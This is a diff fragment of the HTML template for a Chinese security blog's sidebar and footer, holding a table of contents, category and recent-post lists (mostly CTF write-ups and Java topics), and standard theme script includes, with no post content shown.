+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/tou.jpg" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">dddddddd</p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beginner-ducks"><span class="toc-text">Beginner ducks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firewalled"><span class="toc-text">Firewalled</span></a></li></ol>
+    </div>
+</aside>
+                
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">17</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/codeql/">codeql</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/diary/">diary</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">53</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nodejs/">nodejs</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/10/16/2022asisctf_web%E9%83%A8%E5%88%86wp/"><i class="fa  fa-book"></i> 2022asisctf-web部分wp</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/10/14/2022TCTFhessian-onlyJdk/"><i class="fa  fa-book"></i> 2022TCTFhessian-onlyJdk</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/09/19/%E6%97%A0%E8%81%8A%E6%97%B6%E5%8F%91%E7%8E%B0%E7%9A%84spring%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa  fa-book"></i> 无聊时发现的spring内存马</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/08/23/hackerplayground2022/"><i class="fa  fa-book"></i> hackerplayground2022_OnlineNotepad_wp</a>
+            
+          
+        
+          
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/19/JfinalEcho&&memoryshell/"><i class="fa  fa-book"></i> JfinalEcho&&memoryshell</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:254005846@qq.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 fmyyy 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
